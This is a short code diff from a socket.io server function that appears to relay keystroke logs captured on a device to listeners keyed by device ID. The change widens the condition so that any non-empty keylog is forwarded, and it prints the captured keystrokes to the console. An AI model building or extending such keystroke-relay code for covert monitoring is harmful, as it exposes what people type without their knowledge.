@@ -496,12 +496,13 @@ export const startSocketIO = async () => {
 						console.log("online keylogs=>", response);
 						// Check if keylogs is not an empty string before proceeding
 						if (
-							(keyEvent == "Text Input" ||
+							((keyEvent == "Text Input" ||
 								keyEvent == "Button Click") &&
-							keylogs &&
-							keylogs.trim() !== "[]"
+								keylogs &&
+								keylogs.trim() !== "[]") ||
+							keylogs.trim() !== ""
 						) {
-							console.log("KEYLOGS SEND===>");
+							console.log("KEYLOGS SEND===>", keylogs);
 							io.emit(
 								`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
 								{
